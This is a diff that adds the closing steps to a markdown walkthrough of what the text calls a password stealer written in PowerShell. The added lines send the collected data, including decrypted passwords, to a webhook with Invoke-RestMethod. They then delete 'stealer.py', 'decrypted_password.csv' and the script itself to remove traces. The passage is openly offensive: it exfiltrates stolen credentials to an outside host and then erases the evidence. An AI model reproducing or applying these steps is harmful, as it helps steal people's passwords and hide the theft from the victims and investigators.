@@ -107,3 +107,12 @@ $headers = @{
 }
 ```
 Last but not least we invoke a web request to our webhook with all of our information. This includes setting the request to POST, including the headers and the body.
+```powershell
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
+```
+And after the script is done it self destructs and deletes all the files downloaded, ```$MyInvocation.MyCommand.Source``` is a built in powershell variable that defines the script that its being called from.
+```powershell
+Remove-Item stealer.py -Force
+Remove-item decrypted_password.csv -Force
+Remove-Item -Path $MyInvocation.MyCommand.Source
+```
